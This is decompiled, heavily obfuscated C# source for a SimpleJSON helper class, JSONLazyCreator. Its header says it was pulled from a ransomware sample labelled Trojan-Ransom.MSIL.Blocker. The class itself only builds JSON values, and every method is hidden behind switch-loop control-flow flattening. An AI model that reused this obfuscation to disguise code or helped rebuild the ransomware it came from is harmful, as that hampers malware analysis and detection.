// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: TimeSpanTok, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: ECAE311E-CE0C-4BF9-8C57-F98A452B360E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7480e4ba962590b3f14f4516861bb1aa80ffa08223a944ee6599cfe3b4e89bce.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
label_1:
      int num1 = 1056345651;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 361182096)) % 6U)
        {
          case 0:
            num1 = (int) num2 * -56506861 ^ 197487422;
            continue;
          case 1:
            num1 = (int) num2 * -718568060 ^ -1099039552;
            continue;
          case 2:
            this.m_Node = aNode;
            num1 = (int) num2 * 1895757514 ^ 1173414570;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.m_Key = (string) null;
            num1 = (int) num2 * 1996992792 ^ -499697583;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = -1665793258;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1188268348)) % 6U)
        {
          case 0:
            this.m_Node = aNode;
            num1 = (int) num2 * 1925582856 ^ 521877915;
            continue;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -69193576 ^ -1455395572;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * 946955446 ^ 2016107138;
            continue;
          case 5:
            this.m_Key = aKey;
            num1 = (int) num2 * 1385288479 ^ -42520254;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = -1527118443;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1502505985)) % 11U)
        {
          case 0:
            num1 = -1913537087;
            continue;
          case 1:
            this.m_Node = (JSONNode) null;
            num1 = -1632450656;
            continue;
          case 2:
            int num3 = this.m_Key == null ? 1393274599 : (num3 = 1314794969);
            num1 = num3 ^ (int) num2 * 1787969160;
            continue;
          case 3:
            num1 = (int) num2 * -55592503 ^ 1551259978;
            continue;
          case 4:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * -2111959129 ^ 1012862859;
            continue;
          case 5:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * -565621484 ^ 1302074050;
            continue;
          case 6:
            goto label_3;
          case 7:
            num1 = (int) num2 * -1804971212 ^ 333594952;
            continue;
          case 8:
            num1 = (int) num2 * -1228243020 ^ -1880067659;
            continue;
          case 9:
            num1 = (int) num2 * 511740597 ^ -425444320;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = -1272283637;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -270667075)) % 4U)
          {
            case 1:
              num1 = (int) num2 * -1994145697 ^ 1116064450;
              continue;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * 1242550501 ^ -1313978934;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONArray aVal = new JSONArray();
        aVal.Add(value);
label_1:
        int num1 = -1956446607;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2006332614)) % 4U)
          {
            case 0:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 969293988 ^ 150841639;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              num1 = (int) num2 * -2013183476 ^ -1873943598;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = 81756720;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2078430254)) % 4U)
          {
            case 1:
              num1 = (int) num2 * -1776943749 ^ 613861457;
              continue;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * -1349108349 ^ -1371878883;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
        JSONClass aVal = new JSONClass();
        aVal.Add(aKey, value);
        this.Set((JSONNode) aVal);
      }
    }

    public override void Add(JSONNode aItem)
    {
      JSONArray aVal = new JSONArray();
label_1:
      int num1 = 1213155816;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1599446865)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            aVal.Add(aItem);
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 251642063 ^ -1332696099;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = 105858003;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 216519445)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            aVal = new JSONClass();
            num1 = (int) num2 * 1551411458 ^ 2128689854;
            continue;
          case 3:
            aVal.Add(aKey, aItem);
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * -2130255693 ^ 760806353;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
      if (b != null)
        goto label_6;
label_1:
      int num1 = -1205653851;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1983775709)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -759595534 ^ -2101372491;
            continue;
          case 3:
            goto label_6;
          case 4:
            flag = true;
            num1 = (int) num2 * -134600648 ^ -1423665802;
            continue;
          case 5:
            num1 = (int) num2 * -671584105 ^ 1324675864;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
label_6:
      flag = (object) a == b;
      num1 = -712923068;
      goto label_2;
    }

    public static bool operator !=(JSONLazyCreator a, object b) => !(a == b);

    public override bool Equals(object obj)
    {
      if (obj != null)
        goto label_3;
label_1:
      int num1 = -1352573113;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2101664723)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1420160490 ^ 2036417531;
            continue;
          case 2:
            flag = true;
            num1 = (int) num2 * -1141226361 ^ -770026769;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      return flag;
label_3:
      flag = (object) this == obj;
      num1 = -2108794093;
      goto label_2;
    }

    public override int GetHashCode() => base.GetHashCode();

    public override string ToString()
    {
label_1:
      int num1 = 2016010408;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 906419605)) % 4U)
        {
          case 1:
            str = "";
            num1 = (int) num2 * 1835380533 ^ -1174546673;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -481095294 ^ -511337141;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override string ToString(string aPrefix) => "";

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = -400261657;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -351058656)) % 6U)
          {
            case 1:
              this.Set((JSONNode) new JSONData(0));
              num1 = (int) num2 * 1696524012 ^ 42147543;
              continue;
            case 2:
              asInt = 0;
              num1 = (int) num2 * 455125684 ^ 346384562;
              continue;
            case 3:
              num1 = (int) num2 * 1955734857 ^ -126962309;
              continue;
            case 4:
              num1 = (int) num2 * 932698098 ^ 2057921898;
              continue;
            case 5:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_7:
        return asInt;
      }
      set
      {
label_1:
        int num1 = 1136210578;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1834819274)) % 5U)
          {
            case 0:
              num1 = (int) num2 * -1238137971 ^ -1446652053;
              continue;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * 1738375076 ^ -1644127891;
              continue;
            case 2:
              goto label_3;
            case 3:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 494800058 ^ 1959469618;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public override float AsFloat
    {
      get
      {
        JSONData aVal = new JSONData(0.0f);
label_1:
        int num1 = -983661604;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -416997319)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 1443832359 ^ 1633456551;
              continue;
            case 1:
              this.Set((JSONNode) aVal);
              asFloat = 0.0f;
              num1 = (int) num2 * 1368252999 ^ -554260862;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return asFloat;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = 890858297;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1927823347)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = (int) num2 * 282559011 ^ -2844240;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -587987299 ^ 197834452;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = 1627503995;
        JSONData aVal;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 323402630)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * -973740626 ^ -558281442;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              asDouble = 0.0;
              num1 = (int) num2 * 1087481565 ^ 1710517895;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asDouble;
      }
      set
      {
label_1:
        int num1 = -1023894686;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1457910209)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(value);
              num1 = (int) num2 * -2046289429 ^ 1425443846;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 650433480 ^ -1661520740;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = -1338886492;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1237289731)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) new JSONData(false));
              num1 = (int) num2 * -1367182876 ^ -2042023493;
              continue;
            case 2:
              asBool = false;
              num1 = (int) num2 * -130066435 ^ 950051928;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asBool;
      }
      set
      {
label_1:
        int num1 = 284944275;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1933995285)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              aVal = new JSONData(value);
              num1 = (int) num2 * 104755910 ^ 737258598;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        this.Set((JSONNode) aVal);
      }
    }

    public override JSONArray AsArray
    {
      get
      {
        JSONArray aVal = new JSONArray();
label_1:
        int num1 = -2024547841;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -133921938)) % 4U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 354027434 ^ -132371501;
              continue;
            case 2:
              goto label_1;
            case 3:
              asArray = aVal;
              num1 = (int) num2 * -1472221317 ^ 1150823191;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = 1905914227;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 521848777)) % 5U)
          {
            case 1:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1211681371 ^ -1399888582;
              continue;
            case 2:
              asObject = aVal;
              num1 = (int) num2 * -862378481 ^ -1151614049;
              continue;
            case 3:
              num1 = (int) num2 * -357267391 ^ -1776442347;
              continue;
            case 4:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_6:
        return asObject;
      }
    }
  }
}
